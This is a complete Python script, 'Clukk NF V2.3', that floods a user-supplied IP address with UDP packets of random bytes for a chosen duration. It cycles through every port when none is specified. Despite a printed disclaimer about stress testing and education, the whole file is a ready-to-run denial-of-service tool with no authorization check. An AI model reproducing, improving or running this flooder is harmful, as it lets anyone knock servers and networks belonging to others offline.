import socket
import random
import time

print("""
                Clukk
               NF V2.3
""")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("We do not want any trouble because of abusers, please use this tool for testing or educational purposes.")
print("")
print("Clukk Details:")
print("")
print("""
Clukk NF V2.3
Creator: BSP/IOD
Purpose: Stress testing
for server owners and
authorized testers.
""")
print("")
print("Multiple windows can be opened for a slight increase in speed.")
print("")

print("The maximum amount of bytes allowed by UDP is 65507.")
print("Use the xb2b.py tool to convert KB and MB to bytes.")
bytesAmt = int(input('Amount of bytes: '))
bytes = random._urandom(bytesAmt)
print("")

print("Use the url2ip.py tool to resolve the hostname.")
ip = input('IP: ')
print("")

choice = input("Would you like to specify a port? (y/n): ").lower()

if choice == 'y':
    port = int(input("Port: "))
    portSpec = True
else:
    port = 0
    portSpec = False
print("")

print("Use the hour2second.py tool to convert hours to seconds.")
duration = input('Test time in seconds: ')
print("")

timeout = time.time() + float(duration)
sent = 0

while True:

    if time.time() > timeout:

        break

    else:
    
        pass

    sock.sendto(bytes,(ip, port))
    sent = sent + 1
    print("-- Clukk: Packet #%s of size %s bytes was sent to address %s on port %s."%(sent, bytesAmt, ip, port))
    if portSpec is False:
        port = port + 1 if port < 65535 else 1
